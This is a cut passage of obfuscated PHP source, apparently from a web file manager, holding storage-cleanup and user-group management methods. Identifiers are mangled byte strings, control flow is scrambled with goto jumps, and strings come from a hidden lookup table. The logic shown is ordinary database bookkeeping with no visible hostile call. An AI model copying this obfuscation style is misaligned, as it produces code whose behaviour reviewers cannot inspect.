(!$eŠ…µÖŸÏ && !$Aî…„ÔÛ „) { return !1; } $fÍ¾‚ß½µ© = array($fÉÎäÏËË[2156] => $eŠ…µÖŸÏ); if ($Aî…„ÔÛ „) { $fÍ¾‚ß½µ© = array($fÉÎäÏËË[2157] => $Aî…„ÔÛ „); } return $this->order($fÉÎäÏËË[2159])->where($fÍ¾‚ß½µ©)->find(); } public function clearEmpty($c³Ğ¤ó²Â¹ = 0) { goto b‚¶ï‡ã³“; F·„ç’×³: foreach ($AÇ²Ñ‚À©Ò as $EÕƒ“ºÜŠ) { $B¥Õ…¥ÂèÀ->update(1); $this->resetFile($EÕƒ“ºÜŠ); } $B¥Õ…¥ÂèÀ->end(); goto CÖç×À„°Õ; b°Îï»Û®ì: $AÇ²Ñ‚À©Ò = $this->where($F–¤»ÛŠ—ê)->select(); if (!$AÇ²Ñ‚À©Ò) { return; } $B¥Õ…¥ÂèÀ = new Task($bã¹ÁÑÉ«š[2161], $bã¹ÁÑÉ«š[33], count($AÇ²Ñ‚À©Ò)); goto F·„ç’×³; b‚¶ï‡ã³“: $bã¹ÁÑÉ«š =& $_SERVER[í…¶]; $d·›ÀõùÃ» = time() - 3600 * 24 * $c³Ğ¤ó²Â¹; $F–¤»ÛŠ—ê = $bã¹ÁÑÉ«š[2160] . $d·›ÀõùÃ»; goto b°Îï»Û®ì; CÖç×À„°Õ: } private function resetFile($dŒ·ññ²å) { goto eÂ±ºì; eÂ±ºì: $dùê¹¬°…Ë =& $_SERVER[í…¶]; $eÙ»øÑœŒî = array($dùê¹¬°…Ë[429] => $dŒ·ññ²å[$dùê¹¬°…Ë[428]]); $dÂ“¢¨÷…Š = Model($dùê¹¬°…Ë[1115])->where($eÙ»øÑœŒî)->count(); goto Bõ‚Ö³Ş‘»; a„°–İçÍ: if ($dŒ·ññ²å[$dùê¹¬°…Ë[2158]] != $E‚”ëíë§) { $this->where($eÙ»øÑœŒî)->save(array($dùê¹¬°…Ë[2155] => $E‚”ëíë§)); } goto eÈæŒƒºÎ; Bõ‚Ö³Ş‘»: $dò‚¶ÁÇ– = Model($dùê¹¬°…Ë[2162])->where($eÙ»øÑœŒî)->count(); $E‚”ëíë§ = intval($dÂ“¢¨÷…Š) + intval($dò‚¶ÁÇ–); if ($E‚”ëíë§ == 0) { IO::remove($dŒ·ññ²å[$dùê¹¬°…Ë[75]]); $this->where($eÙ»øÑœŒî)->delete(); $this->metaSet($dŒ·ññ²å[$dùê¹¬°…Ë[428]], null, null); return; } goto a„°–İçÍ; eÈæŒƒºÎ: } public function storageInfo($CĞ¾“ˆ˜ºÜ = false) { goto D¨‰›Û†ÑØ; e÷ ¥ ÁËÇ: $a¯ÏïŸ¿ÓÖ = 1; $D…²ëĞÇ‡ = 0; $bÁã–˜¾©î = 5000; goto A¢ÈÇë‰ŠŞ; A¢ÈÇë‰ŠŞ: for ($c•³ç§Ò¸ï = 0; $c•³ç§Ò¸ï < $B’ßã¤ã; $c•³ç§Ò¸ï = $c•³ç§Ò¸ï + $bÁã–˜¾©î) { $fÚ½°ÚÛéé = $this->limit($c•³ç§Ò¸ï, $c•³ç§Ò¸ï + $bÁã–˜¾©î)->select(); foreach ($fÚ½°ÚÛéé as $e¬ÂÌ”ˆ¡°) { $a¯ÏïŸ¿ÓÖ += $e¬ÂÌ”ˆ¡°[$càŞ§„Ö¡[77]] * $e¬ÂÌ”ˆ¡°[$càŞ§„Ö¡[2158]]; $B‡Æ·’¿Ì += $e¬ÂÌ”ˆ¡°[$càŞ§„Ö¡[77]] * ($e¬ÂÌ”ˆ¡°[$càŞ§„Ö¡[2158]] - 1); $D…²ëĞÇ‡ += $e¬ÂÌ”ˆ¡°[$càŞ§„Ö¡[2158]]; } } $B©ƒÔÓë“ç = array($càŞ§„Ö¡[2163] => $a¯ÏïŸ¿ÓÖ, $càŞ§„Ö¡[2164] => $B‡Æ·’¿Ì, $càŞ§„Ö¡[2165] => $B‡Æ·’¿Ì / $a¯ÏïŸ¿ÓÖ, $càŞ§„Ö¡[81] => $B’ßã¤ã, $càŞ§„Ö¡[2166] => $D…²ëĞÇ‡); return $B©ƒÔÓë“ç; goto DÄ•ƒÄ™İ; D¨‰›Û†ÑØ: $càŞ§„Ö¡ =& $_SERVER[í…¶]; $B’ßã¤ã = $this->count() + 0.0; $B‡Æ·’¿Ì = 0; goto e÷ ¥ ÁËÇ; DÄ•ƒÄ™İ: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\x6d\x65" => "\x67\162\157\165\160\x5f\x6d\x65\164\141", "\155\145\x74\x61\106\x69\x65\x6c\144" => "\147\x72\x6f\165\x70\111\104"); protected function cacheFunctionAlias($aÃê—À°ô¤) { $B›«êš¼Æ½ =& $_SERVER[í…¶]; return array($B›«êš¼Æ½[2167] => array($aÃê—À°ô¤[0], $B›«êš¼Æ½[2168]), $B›«êš¼Æ½[2169] => array($aÃê—À°ô¤[0], $B›«êš¼Æ½[2168])); } protected function getInfo($c¨‡ñ…•ó) { $E…Ö ¹Ÿ˜¾ = $this->getInfoSimple($c¨‡ñ…•ó); if (!$E…Ö ¹Ÿ˜¾) { return !1; } return $this->_listDataApplyItem($E…Ö ¹Ÿ˜¾); } protected function getInfoSimple($BÏ¬»ÑµÑ¶, $DËÖÃï«ª = false) { $f¼ÛªšŞàµ =& $_SERVER[í…¶]; if ($DËÖÃï«ª) { $e¡˜Ã‰ÌÓ = array($f¼ÛªšŞàµ[2101] => intval($BÏ¬»ÑµÑ¶)); $eãæ¦ Ó¦ = $this->where($e¡˜Ã‰ÌÓ)->find(); return is_array($eãæ¦ Ó¦) ? $eãæ¦ Ó¦ : array(); } return $this->cacheFunctionGet($f¼ÛªšŞàµ[2170], $BÏ¬»ÑµÑ¶); } protected function groupAdd($E‚‰Ø£Õóò) { goto cõéÙ÷°…œ; c³Š Á®“Ê: if (isset($E‚‰Ø£Õóò[$e­‘ñ­§§[2173]])) { $this->metaSet($f²„ Õ˜Ğß, array($e­‘ñ­§§[2173] => $E‚‰Ø£Õóò[$e­‘ñ­§§[2173]], $e­‘ñ­§§[2174] => $E‚‰Ø£Õóò[$e­‘ñ­§§[2174]])); unset($E‚‰Ø£Õóò[$e­‘ñ­§§[2173]]); unset($E‚‰Ø£Õóò[$e­‘ñ­§§[2174]]); } Model($e­‘ñ­§§[1115])->groupRootAdd($f²„ Õ˜Ğß); return $f²„ Õ˜Ğß; goto bØİœ¦ƒ; cõéÙ÷°…œ: $e­‘ñ­§§ =& $_SERVER[í…¶]; if (!$E‚‰Ø£Õóò[$e­‘ñ­§§[470]] && isset($E‚‰Ø£Õóò[$e­‘ñ­§§[2101]]) && $E‚‰Ø£Õóò[$e­‘ñ­§§[2101]] == 1) { if ($c”‘ŞÊ“ùõ = $this->getInfoSimple($E‚‰Ø£Õóò[$e­‘ñ­§§[2101]], !0)) { return $E‚‰Ø£Õóò[$e­‘ñ­§§[2101]]; } } else { $c”‘ŞÊ“ùõ = $this->getInfoSimple($E‚‰Ø£Õóò[$e­‘ñ­§§[470]]); if (!$c”‘ŞÊ“ùõ) { return !1; } } $Bï¬×ïˆ = $e­‘ñ­§§[479]; goto Eİì‹šÚ‚œ; D¯§¥ìÅÛŞ: if (!empty($E‚‰Ø£Õóò[$e­‘ñ­§§[2101]])) { $C‚Ü±à“ïÙ[$e­‘ñ­§§[2101]] = $E‚‰Ø£Õóò[$e­‘ñ­§§[2101]]; } $f²„ Õ˜Ğß = $this->add($C‚Ü±à“ïÙ); $this->setNamePinyin($f²„ Õ˜Ğß, $C‚Ü±à“ïÙ[$e­‘ñ­§§[28]]); goto c³Š Á®“Ê; Eİì‹šÚ‚œ: if ($c”‘ŞÊ“ùõ[$e­‘ñ­§§[468]]) { $Bï¬×ïˆ = $c”‘ŞÊ“ùõ[$e­‘ñ­§§[468]] . $c”‘ŞÊ“ùõ[$e­‘ñ­§§[2101]] . $e­‘ñ­§§[47]; } $C‚Ü±à“ïÙ = array($e­‘ñ­§§[395] => $this->groupNameAuto($E‚‰Ø£Õóò[$e­‘ñ­§§[470]], $E‚‰Ø£Õóò[$e­‘ñ­§§[28]]), $e­‘ñ­§§[377] => $E‚‰Ø£Õóò[$e­‘ñ­§§[470]], $e­‘ñ­§§[534] => $Bï¬×ïˆ, $e­‘ñ­§§[2171] => $E‚‰Ø£Õóò[$e­‘ñ­§§[2085]], $e­‘ñ­§§[2172] => 0, $e­‘ñ­§§[2105] => 0); if (isset($E‚‰Ø£Õóò[$e­‘ñ­§§[2122]])) { $C‚Ü±à“ïÙ[$e­‘ñ­§§[2122]] = $E‚‰Ø£Õóò[$e­‘ñ­§§[2122]]; } else { $DÇ÷˜êÜ¢ = $this->max($e­‘ñ­§§[2122]); if (!$DÇ÷˜êÜ¢) { $DÇ÷˜êÜ¢ = 0; } $C‚Ü±à“ïÙ[$e­‘ñ­§§[2122]] = $DÇ÷˜êÜ¢ + 1; } goto D¯§¥ìÅÛŞ; bØİœ¦ƒ: } protected function groupEdit($DŠ‘İÉïÈ, $aÕêÊÜ¨Œ) { $eãŸ‰¬¦¢ç =& $_SERVER[í…¶]; if (!empty($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[470]])) { $Aùåº¿­’â = $this->getInfoSimple($DŠ‘İÉïÈ); $Fœº‹”ˆäÔ = $this->getInfoSimple($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[470]]); if (!$Aùåº¿­’â || !$Fœº‹”ˆäÔ) { return !1; } if ($Aùåº¿­’â[$eãŸ‰¬¦¢ç[2101]] == $Fœº‹”ˆäÔ[$eãŸ‰¬¦¢ç[2101]]) { return !1; } if ($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[470]] != $Aùåº¿­’â[$eãŸ‰¬¦¢ç[470]]) { if ($Fœº‹”ˆäÔ[$eãŸ‰¬¦¢ç[468]] !== $Aùåº¿­’â[$eãŸ‰¬¦¢ç[468]] && strpos($Fœº‹”ˆäÔ[$eãŸ‰¬¦¢ç[468]], $Aùåº¿­’â[$eãŸ‰¬¦¢ç[468]] . $Aùåº¿­’â[$eãŸ‰¬¦¢ç[2101]] . $eãŸ‰¬¦¢ç[47]) === 0) { return !1; } $aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[534]] = $Fœº‹”ˆäÔ[$eãŸ‰¬¦¢ç[468]] . $aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[470]] . $eãŸ‰¬¦¢ç[47]; $this->_changeChildLevel($Aùåº¿­’â, $Fœº‹”ˆäÔ); } } if (isset($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[28]])) { $this->setNamePinyin($DŠ‘İÉïÈ, $aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[28]]); } if (isset($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[2173]])) { $this->metaSet($DŠ‘İÉïÈ, array($eãŸ‰¬¦¢ç[2173] => $aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[2173]], $eãŸ‰¬¦¢ç[2174] => $aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[2174]])); unset($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[2173]]); unset($aÕêÊÜ¨Œ[$eãŸ‰¬¦¢ç[2174]]); } return $this->where(array($eãŸ‰¬¦¢ç[2175] => $DŠ‘İÉïÈ))->save($aÕêÊÜ¨Œ); } private function _changeChildLevel($E«É¾ª½Ô‡, $EùÑğèš“ç, $E†ˆÔÄµ„ˆ = false) { goto fÄÉšĞš›Ÿ; a¤‡¸šŸ™¨: $this->where($déµ­ˆ ×)->data($aÆèÛÃ™ÌÑ)->save(); goto C½ÎÅ±²‰ñ; AÔŠ¸Ææ™£: if ($E†ˆÔÄµ„ˆ) { $fö–ù–æ‹µ = $EùÑğèš“ç[$dùïÇÃ“…[468]] . $EùÑğèš“ç[$dùïÇÃ“…[2101]] . $dùïÇÃ“…[47]; } $déµ­ˆ × = array($dùïÇÃ“…[534] => array($dùïÇÃ“…[492], $E«É¾ª½Ô‡[$dùïÇÃ“…[468]] . $E«É¾ª½Ô‡[$dùïÇÃ“…[2101]] . $dùïÇÃ“…[493])); $aÆèÛÃ™ÌÑ = array($dùïÇÃ“…[534] => array($dùïÇÃ“…[543], "\162\145\x70\x6c\141\143\x65\50\160\141\162\145\156\164\x4c\145\x76\x65\x6c\x2c\x27{$BÓ´¥†¾™Ş}\47\x2c\x27{$fö–ù–æ‹µ}\47\51")); goto a¤‡¸šŸ™¨; fÄÉšĞš›Ÿ: $dùïÇÃ“… =& $_SERVER[í…¶]; $BÓ´¥†¾™Ş = $E«É¾ª½Ô‡[$dùïÇÃ“…[468]] . $E«É¾ª½Ô‡[$dùïÇÃ“…[2101]] . $dùïÇÃ“…[47]; $fö–ù–æ‹µ = $EùÑğèš“ç[$dùïÇÃ“…[468]] . $EùÑğèš“ç[$dùïÇÃ“…[2101]] . $dùïÇÃ“…[47] . $E«É¾ª½Ô‡[$dùïÇÃ“…[2101]] . $dùïÇÃ“…[47]; goto AÔŠ¸Ææ™£; C½ÎÅ±²‰ñ: } public function setNamePinyin($A‹Ä´ä—, $fÈ©‰·ìá = false) { $fµ‘ùŞœŒ =& $_SERVER[í…¶]; if (!$fÈ©‰·ìá) { $F‹ñ½‹˜Ó÷ = $this->getInfoSimple($A‹Ä´ä—); $fÈ©‰·ìá = $F‹ñ½‹˜Ó÷[$fµ‘ùŞœŒ[28]]; } if (!Input::check($fÈ©‰·ìá, $fµ‘ùŞœŒ[537])) { $this->metaSet($A‹Ä´ä—, $fµ‘ùŞœŒ[425], null); $this->metaSet($A‹Ä´ä—, $fµ‘ùŞœŒ[424], null); return; } $f‹¥ÚØ„ = array($fµ‘ùŞœŒ[425] => str_replace($fµ‘ùŞœŒ[50], $fµ‘ùŞœŒ[33], Pinyin::encode($fÈ©‰·ìá)), $fµ‘ùŞœŒ[424] => Pinyin::encode($fÈ©‰·ìá, $fµ‘ùŞœŒ[538])); $this->metaSet($A‹Ä´ä—, $f‹¥ÚØ„); } protected function groupStatus($F‚ò¿¾Ìƒ, $D©Ò²Â“¤½) { goto c‰ Ú‘Îğê; B¸ÜÊ§µíÒ: foreach ($Cë¨ƒïá¾ as $F‚ò¿¾Ìƒ) { $b¥ìÃöÔ‹‡[] = array($aµ°ÍÑ²ä[2101] => $F‚ò¿¾Ìƒ, $aµ°ÍÑ²ä[89] => $aµ°ÍÑ²ä[691], $aµ°ÍÑ²ä[368] => $D©Ò²Â“¤½); } return Model($aµ°ÍÑ²ä[2176])->addAll($b¥ìÃöÔ‹‡, array(), !0); goto Aí–›‚ãÀ°; a¾§ÀÅ²‚š: if ($D©Ò²Â“¤½ == $aµ°ÍÑ²ä[83]) { $Cë¨ƒïá¾ = $this->parentLevelArray($BÜ»ŸÕÒÂ[$aµ°ÍÑ²ä[468]]); } else { $a‹´Âô = array($aµ°ÍÑ²ä[534] => array($aµ°ÍÑ²ä[492], $BÜ»ŸÕÒÂ[$aµ°ÍÑ²ä[468]] . $BÜ»ŸÕÒÂ[$aµ°ÍÑ²ä[2101]] . $aµ°ÍÑ²ä[493])); $Cë¨ƒïá¾ = $this->where($a‹´Âô)->field($aµ°ÍÑ²ä[2101])->select(); $Cë¨ƒïá¾ = array_to_keyvalue($Cë¨ƒïá¾, $aµ°ÍÑ²ä[33], $aµ°ÍÑ²ä[2101]); } $Cë¨ƒïá¾[] = $BÜ»ŸÕÒÂ[$aµ°ÍÑ²ä[2101]]; $b¥ìÃöÔ‹‡ = array(); goto B¸ÜÊ§µíÒ; c‰ Ú‘Îğê: $aµ°ÍÑ²ä =& $_SERVER[í…¶]; $BÜ»ŸÕÒÂ = $this->getInfoSimple($F‚ò¿¾Ìƒ); if (!$BÜ»ŸÕÒÂ) { return !1; } goto a¾§ÀÅ²‚š; Aí–›‚ãÀ°: } private function _groupStatusApply($bÑ‡åâ…ˆ”, $d‘ƒ¯ôĞÉ¯) { $eéà±ÓŒù² =& $_SERVER[í…¶]; if ($d‘ƒ¯ôĞÉ¯ == $eéà±ÓŒù²[83]) { $A–œ„Ñ±íÙ = $this->parentLevelArray($bÑ‡åâ…ˆ”[$eéà±ÓŒù²[468]]); } else { $Dâ¦Ï¿ÅÅÌ = array($eéà±ÓŒù²[534] => array($eéà±ÓŒù²[492], $bÑ‡åâ…ˆ”[$eéà±ÓŒù²[468]] . $bÑ‡åâ…ˆ”[$eéà±ÓŒù²[2101]] . $eéà±ÓŒù²[493])); $A–œ„Ñ±íÙ = $this->where($Dâ¦Ï¿ÅÅÌ)->field($eéà±ÓŒù²[2101])->select(); $A–œ„Ñ±íÙ = array_to_keyvalue($A–œ„Ñ±íÙ, $eéà±ÓŒù²[33], $eéà±ÓŒù²[2101]); } if (empty($A–œ„Ñ±íÙ)) { return; } $E¬ÛÌ¼·¯Ã = array(); foreach ($A–œ„Ñ±íÙ as $E«áÃË¾†) { $E¬ÛÌ¼·¯Ã[] = array($eéà±ÓŒù²[2101] => $E«áÃË¾†, $eéà±ÓŒù²[89] => $eéà±ÓŒù²[691], $eéà±ÓŒù²[368] => $d‘ƒ¯ôĞÉ¯); } Model($eéà±ÓŒù²[2176])->addAll($E¬ÛÌ¼·¯Ã, array(), !0); } protected function groupRemove($cŠÌ®ĞƒÄÜ) { goto Dà­±á‡Ù°; E£ºØØÔ: $this->where(array($b¼º¢¿ö×[470] => $cŠÌ®ĞƒÄÜ))->save(array($b¼º¢¿ö×[470] => $a‘³õÇ±[$b¼º¢¿ö×[470]])); Model($b¼º¢¿ö×[2176])->where($DŞğ‹ÊÜàÊ)->delete(); Model($b¼º¢¿ö×[2177])->where($DŞğ‹ÊÜàÊ)->delete(); goto a‹°Ü¬¯çØ; Dà­±á‡Ù°: $b¼º¢¿ö× =& $_SERVER[í…¶]; $DŞğ‹ÊÜàÊ = array($b¼º¢¿ö×[2101] => $cŠÌ®ĞƒÄÜ); $a‘³õÇ± = $this->where($DŞğ‹ÊÜàÊ)->find(); goto fç¡Ì‡ñ¥¯; a‹°Ü¬¯çØ: Model($b¼º¢¿ö×[755])->groupRootRemove($cŠÌ®ĞƒÄÜ); return $this->where($DŞğ‹ÊÜàÊ)->delete(); goto Cà ì§ÂÔ; fç¡Ì‡ñ¥¯: if (!$a‘³õÇ± || $a‘³õÇ±[$b¼º¢¿ö×[470]] == 0) { return !1; } $f´œŠğ£¶¶ = $this->getInfoSimple($a‘³õÇ±[$b¼º¢¿ö×[470]]); $this->_changeChildLevel($a‘³õÇ±, $f´œŠğ£¶¶, !0); goto E£ºØØÔ; Cà ì§ÂÔ: } protected function groupSort($DÓÕõà‘) { $b®…í’åé§ =& $_SERVER[í…¶]; $CÌŒòÆâç = array(); foreach ($DÓÕõà‘ as $eØç´éíªá => $béæİÆÕ‡) { $CÌŒòÆâç[] = array($b®…í’åé§[2101], $béæİÆÕ‡, $b®…í’åé§[2122], $eØç´éíªá + 1); } $this->saveAll($CÌŒòÆâç); } public function listData() { $Fğ¨°•¦ïÁ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Fğ¨°•¦ïÁ[$_SERVER[í…¶][363]]); return $Fğ¨°•¦ïÁ; } private function _makeOrder($f¬ÈÍ•Éª = '') { goto e¤÷¬­º…Ú; bÇÛ•ãÃĞ: $A³ïñï¨­ = Input::get($A¡éº§õ©ê[416], $A¡éº§õ©ê[7], $A¡éº§õ©ê[2105], $CØŠ¨÷¬öÊ); $E¥ì·Èğ¼Ê = Input::get($A¡éº§õ©ê[417], $A¡éº§õ©ê[7], $A¡éº§õ©ê[2178], array($A¡éº§õ©ê[2178], $A¡éº§õ©ê[413])); $E¥ì·Èğ¼Ê = $F¿˜Šô™ª˜[$E¥ì·Èğ¼Ê]; goto B–ŒÖÆ³öˆ; e¤÷¬­º…Ú: $A¡éº§õ©ê =& $_SERVER[í…¶]; $CØŠ¨÷¬öÊ = array($A¡éº§õ©ê[2101], $A¡éº§õ©ê[28], $A¡éº§õ©ê[2087], $A¡éº§õ©ê[187]); $F¿˜Šô™ª˜ = array($A¡éº§õ©ê[411] => $A¡éº§õ©ê[412], $A¡éº§õ©ê[413] => $A¡éº§õ©ê[414]); goto bÇÛ•ãÃĞ; B–ŒÖÆ³öˆ: $f¬ÈÍ•Éª = $f¬ÈÍ•Éª . "{$A³ïñï¨­}\x20{$E¥ì·Èğ¼Ê}\x2c\x20\x67\162\x6f\165\160\x49\x44\x20\x61\163\143"; return $this->order($f¬ÈÍ•Éª); goto D–ÕŒ¢„¯å; D–ÕŒ¢„¯å: } public function listChild($aö²©ğŸË) { $BÚ“ÎŞè·Õ =& $_SERVER[í…¶]; $aéø¨Ÿ‘‰è = $this->where(array($BÚ“ÎŞè·Õ[470] => $aö²©ğŸË))->_makeOrder()->selectPage(200); $this->_listDataApply($aéø¨Ÿ‘‰è[$BÚ“ÎŞè·Õ[363]]); return $aéø¨Ÿ‘‰è; } public function listByID($Fä–‚ÇõÂ) { $aÀˆ÷øÙôĞ =& $_SERVER[í…¶]; if (!$Fä–‚ÇõÂ) { return array(); } $FÌÌäŒ×Ï‰ = array($aÀˆ÷øÙôĞ[2101] => array($aÀˆ÷øÙôĞ[7], $Fä–‚ÇõÂ)); $bèˆ¸µ“õ™ = $this->where($FÌÌäŒ×Ï‰)->select(); $this->_listDataApply($bèˆ¸µ“õ™); return $bèˆ¸µ“õ™; } public function listSearch($BÚ¯÷ãŸ) { goto D‹šÏ¸ˆÇ; D‹šÏ¸ˆÇ: $dñÂÏí‡ =& $_SERVER[í…¶]; $e›Ì„–Šò = $BÚ¯÷ãŸ[$dñÂÏí‡[2179]]; $D¿±¶„ë¤ = isset($BÚ¯÷ãŸ[$dñÂÏí‡[2180]]) ? $BÚ¯÷ãŸ[$dñÂÏí‡[2180]] : !1; goto F‚ÙæÊóÚŞ; F‚ÙæÊóÚŞ: if (!trim($e›Ì„–Šò)) { return !1; } $e›Ì„–Šò = str_replace($dñÂÏí‡[2181], $dñÂÏí‡[2182], $e›Ì„–Šò); $CµóåÄÓ·Â = array($dñÂÏí‡[2101] => array($dñÂÏí‡[754], "\45{$e›Ì„–Šò}\x25"), $dñÂÏí‡[28] => array($dñÂÏí‡[754], "\45{$e›Ì„–Šò}\x25"), $dñÂÏí‡[912] => $dñÂÏí‡[2183]); goto cˆ«àØÄĞ; b¶ï¯¼µ›ë: if (!$Bùíğ½ƒöĞ || count($Bùíğ½ƒöĞ[$dñÂÏí‡[363]]) < 5 && Input::check($e›Ì„–Šò, $dñÂÏí‡[306])) { goto a‘ŸÂ÷ÌİÉ; f™Ù–‰Á¡Ò: $B×¥‘ÅĞ¤ = array_merge($fñŠàŒ¾Ä», $Fë’ãÍ‰—Œ, $Bùíğ½ƒöĞ[$dñÂÏí‡[363]]); $Bùíğ½ƒöĞ[$dñÂÏí‡[363]] = array_unique_by_key($B×¥‘ÅĞ¤, $dñÂÏí‡[2101]); $Bùíğ½ƒöĞ[$dñÂÏí‡[360]][$dñÂÏí‡[361]] = count($Bùíğ½ƒöĞ[$dñÂÏí‡[363]]); goto e÷—Ê›ƒ»ø; e÷—Ê›ƒ»ø: $Bùíğ½ƒöĞ[$dñÂÏí‡[360]][$dñÂÏí‡[362]] = ceil($Bùíğ½ƒöĞ[$dñÂÏí‡[360]][$dñÂÏí‡[361]] / $Bùíğ½ƒöĞ[$dñÂÏí‡[360]][$dñÂÏí‡[358]]); goto A ¼ØÔãíÀ; a‘ŸÂ÷ÌİÉ: $e„ÜÃÛ’‘ = $this->groupChildrenAll($D¿±¶„ë¤); $fñŠàŒ¾Ä» = $this->_searchFromMeta($dñÂÏí‡[424], $e›Ì„–Šò, 10, $e„ÜÃÛ’‘); $Fë’ãÍ‰—Œ = $this->_searchFromMeta($dñÂÏí‡[425], $e›Ì„–Šò, 10, $e„ÜÃÛ’‘); goto f™Ù–‰Á¡Ò; A ¼ØÔãíÀ: } $this->_listDataApply($Bùíğ½ƒöĞ[$dñÂÏí‡[363]]); return $Bùíğ½ƒöĞ; goto aİÎ²Å¥¼æ; cˆ«àØÄĞ: if ($D¿±¶„ë¤) { $c­ö¼ˆ¤… = $this->getInfoSimple($D¿±¶„ë¤); $d˜Ü ÕŒöç = $c­ö¼ˆ¤…[$dñÂÏí‡[468]] . $D¿±¶„ë¤ . $dñÂÏí‡[493]; $CµóåÄÓ·Â = array($CµóåÄÓ·Â, array($dñÂÏí‡[468] => array($dñÂÏí‡[754], $d˜Ü ÕŒöç))); } $Bùíğ½ƒöĞ = $this->_makeOrder()->where($CµóåÄÓ·Â)->selectPage(20); $Bùíğ½ƒöĞ = $Bùíğ½ƒöĞ ? $Bùíğ½ƒöĞ : array(); goto b¶ï¯¼µ›ë; aİÎ²Å¥¼æ: } protected function groupChildrenAll($fìù‰È“¨ê) { $bÛÙŒ’¢Ä =& $_SERVER[í…¶]; if (!$fìù‰È“¨ê) { return !1; } if (is_string($fìù‰È“¨ê)) { $fìù‰È“¨ê = array($fìù‰È“¨ê); } $fîÃö¯ó—Á = $fìù‰È“¨ê; foreach ($fìù‰È“¨ê as $dçÓŠƒ­ïß) { $bÈÓÜ ßµÂ = $this->getInfoSimple($dçÓŠƒ­ïß); $eåğ”Ë‡”ß = array($bÛÙŒ’¢Ä[468] => array($bÛÙŒ’¢Ä[754], $bÈÓÜ ßµÂ[$bÛÙŒ’¢Ä[468]] . $dçÓŠƒ­ïß . $bÛÙŒ’¢Ä[493])); $d—‚‚¦è¨‹ = $this->field($bÛÙŒ’¢Ä[2101])->where($eåğ”Ë‡”ß)->select(); $fîÃö¯ó—Á = array_merge($fîÃö¯ó—Á, array_to_keyvalue($d—‚‚¦è¨‹, $bÛÙŒ’¢Ä[33], $bÛÙŒ’¢Ä[2101])); } return array_unique($fîÃö¯ó—Á); } private function _searchFromMeta($Có„£ê¤¼®, $D ĞÊöäªĞ, $cÌ”—œöØ, $CÖ„©õÂÒ) { goto aáÂƒ¬¸‰; CãŸ‚­ÅªŠ: $e¬˜ØÜãÎ‹ = array_to_keyvalue($e¬˜ØÜãÎ‹, $CíºÛÌ©æ[33], $CíºÛÌ©æ[2101]); $fĞô‚²ùªŒ = $this->where(array($CíºÛÌ©æ[2175] => array($CíºÛÌ©æ[7], $e¬˜ØÜãÎ‹)))->select(); if (!$fĞô‚²ùªŒ) { return array(); } goto aö¡Ø„°´Ù; fªçå÷†ÉÈ: if ($CÖ„©õÂÒ) { $d…¦„íÁç[$CíºÛÌ©æ[2101]] = array($CíºÛÌ©æ[7], $CÖ„©õÂÒ); } $e¬˜ØÜãÎ‹ = Model($CíºÛÌ©æ[2184])->where($d…¦„íÁç)->limit($cÌ”—œöØ)->select(); if (!$e¬˜ØÜãÎ‹) { return array(); } goto CãŸ‚­ÅªŠ; aáÂƒ¬¸‰: $CíºÛÌ©æ =& $_SERVER[í…¶]; $D ĞÊöäªĞ = strtolower($D ĞÊöäªĞ); $d…¦„íÁç = array($CíºÛÌ©æ[89] => $Có„£ê¤¼®, $CíºÛÌ©æ[368] => array($CíºÛÌ©æ[754], "\x25{$D ĞÊöäªĞ}\45")); goto fªçå÷†ÉÈ; aö¡Ø„°´Ù: return $fĞô‚²ùªŒ; goto C§ğª£Ñ¬ë; C§ğª£Ñ¬ë: } protected function _listDataApplyItem($c£ÀÕÛÅ—î) { $AßÉöîÅ«š = array($c£ÀÕÛÅ—î); $this->_listDataApply($AßÉöîÅ«š); return $AßÉöîÅ«š[0]; } protected function _listDataApply(&$C×óô‹§ÎÁ) { goto f·ŸŠˆõ«‚; f·ŸŠˆõ«‚: $a•’¿Òˆ¸¡ =& $_SERVER[í…¶]; if (!$C×óô‹§ÎÁ) { return; } $DÙ·›ß‡Œ = array_to_keyvalue($C×óô‹§ÎÁ, $a•’¿Òˆ¸¡[33], $a•’¿Òˆ¸¡[2101]); goto fÄß­İï; fÄß­İï: $this->_listAppendChildren($C×óô‹§ÎÁ); $this->_listAppendChildrenMember($C×óô‹§ÎÁ); $this->_listAppendMeta($C×óô‹§ÎÁ, $DÙ·›ß‡Œ); goto a÷–×°Å×Å; a÷–×°Å×Å: $this->_listAppendParent($C×óô‹§ÎÁ); $this->_listAppendSourceRoot($C×óô‹§ÎÁ, $DÙ·›ß‡Œ); goto EËğ”ºøé; EËğ”ºøé: } private function _listAppendChildren(&$d°øĞˆÏÓ) { goto b·ª¶ñ‹™; b·ª¶ñ‹™: $C¦ÜšÉ‚Ş =& $_SERVER[í…¶]; $cá¯Ğ‰Öñì = $C¦ÜšÉ‚Ş[370]; $E³Ì´…Ğ‘ = array(); goto a‚­½İçªÆ; e¤ÀÊ™´¼½: $E³Ì´…Ğ‘ = array_to_keyvalue($E³Ì´…Ğ‘, $C¦ÜšÉ‚Ş[459]); foreach ($d°øĞˆÏÓ as &$a’Ãìµ½¥ï) { $a’Ãìµ½¥ï[$C¦ÜšÉ‚Ş[2185]] = isset($E³Ì´…Ğ‘[$a’Ãìµ½¥ï[$C¦ÜšÉ‚Ş[2101]] . $C¦ÜšÉ‚Ş[2186]]); } goto bÓ„•–‹˜÷; a‚­½İçªÆ: $dŠÚøõÖ‰ø = count($d°øĞˆÏÓ); $DÊÁ…–ÇÃ¥ = $this->tablePrefix . $this->tableName; for ($d”œ¹¡„† = 0, $fµæÊì‚Æ = 0; $d”œ¹¡„† < $dŠÚøõÖ‰ø; $d”œ¹¡„†++) { $fµæÊì‚Æ++; $BõÚÒ¤¥ = $d°øĞˆÏÓ[$d”œ¹¡„†][$C¦ÜšÉ‚Ş[2101]]; $cá¯Ğ‰Öñì .= 